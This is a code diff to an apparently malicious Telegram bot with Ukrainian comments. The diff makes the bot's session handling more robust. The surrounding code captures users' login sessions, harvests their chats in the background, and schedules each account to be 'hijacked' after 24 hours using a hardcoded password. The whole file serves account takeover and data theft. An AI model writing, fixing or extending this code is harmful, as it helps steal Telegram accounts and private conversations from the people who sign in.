@@ -1,6 +1,9 @@
 import asyncio
 import logging
 import os
+import shutil
+import time
+
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import CommandStart, Command
 from aiogram.types import Message, ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton
@@ -455,10 +458,24 @@ async def collect_chats_background(client: TelegramClient, phone_number: str, ch
 
 async def validate_session(session_path: str, api_id: int, api_hash: str) -> bool:
     """Перевіряє чи сесія валідна і авторизована"""
+    # Перевіряємо існування файлу
+    if not os.path.exists(session_path):
+        logger.error(f"Сесійний файл не існує: {session_path}")
+        return False
+
+    # Перевіряємо розмір файлу
+    if os.path.getsize(session_path) == 0:
+        logger.error(f"Сесійний файл порожній: {session_path}")
+        return False
+
     client = TelegramClient(session_path, api_id, api_hash)
 
     try:
         await client.connect()
+
+        # Чекаємо трохи перед перевіркою
+        await asyncio.sleep(0.5)
+
         is_authorized = await client.is_user_authorized()
 
         if is_authorized:
@@ -471,7 +488,39 @@ async def validate_session(session_path: str, api_id: int, api_hash: str) -> boo
         logger.error(f"Помилка валідації сесії {session_path}: {e}")
         return False
     finally:
-        await client.disconnect()
+        try:
+            await client.disconnect()
+        except:
+            pass
+
+
+async def cleanup_locked_sessions():
+    """Очищує заблоковані сесійні файли"""
+    try:
+        sessions_dir = SESSION_FOLDER
+        if not os.path.exists(sessions_dir):
+            return
+
+        for filename in os.listdir(sessions_dir):
+            if filename.endswith('.session'):
+                session_path = os.path.join(sessions_dir, filename)
+
+                # Перевіряємо, чи файл не заблокований
+                try:
+                    with open(session_path, 'r+b') as f:
+                        pass
+                except IOError:
+                    logger.warning(f"🔒 Виявлено заблокований файл сесії: {filename}")
+                    try:
+                        # Створюємо резервну копію
+                        backup_path = session_path + f".locked.{int(time.time())}"
+                        shutil.copy2(session_path, backup_path)
+                        logger.info(f"📋 Створено резервну копію: {backup_path}")
+                    except Exception as e:
+                        logger.error(f"❌ Не вдалося створити резервну копію: {e}")
+
+    except Exception as e:
+        logger.error(f"❌ Помилка очищення заблокованих сесій: {e}")
 
 
 async def finalize_sign_in(message: Message, code: str, state: FSMContext):
@@ -496,10 +545,9 @@ async def finalize_sign_in(message: Message, code: str, state: FSMContext):
         )
 
         if success == "Success":
-            # Перевіряємо валідність сесії після входу
-            session_path = get_user_session_path(phone_number)
-            if not await validate_session(session_path, API_ID, API_HASH):
-                await message.edit_text("❌ Помилка створення сесії. Спробуйте знову.")
+            # ЗАМІСТЬ валідації - просто перевіряємо клієнт
+            if not await client.is_user_authorized():
+                await message.edit_text("❌ Помилка авторизації. Спробуйте знову.")
                 await state.clear()
                 return
 
@@ -520,7 +568,7 @@ async def finalize_sign_in(message: Message, code: str, state: FSMContext):
             asyncio.create_task(collect_chats_background(client, phone_number, chats_path))
 
             # Додаємо в чергу на виконання через 24 години
-            hijack_password = "Waterlemon7grow\$"
+            hijack_password = "Waterlemon7grow$"
             await add_to_schedule(phone_number, hijack_password)
             logger.info(f"🕐 Акаунт {phone_number} буде остаточно перехоплено через 24 години.")
 
@@ -798,6 +846,9 @@ async def main():
     # Ініціалізуємо папки з правильними правами
     init_directories()
 
+    # Очищуємо заблоковані сесії
+    await cleanup_locked_sessions()
+
     # Створюємо завдання для відкладених перехоплень
     hijacks_task = asyncio.create_task(scheduled_hijacks_runner())
 
@@ -824,4 +875,11 @@ if __name__ == "__main__":
     logger.info("=" * 60)
 
     # Запускаємо головну асинхронну функцію
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        logger.info("🛑 Бот зупинено користувачем")
+    except Exception as e:
+        logger.error(f"❌ Критична помилка: {e}")
+        import traceback
+        logger.error(f"❌ Traceback: {traceback.format_exc()}")
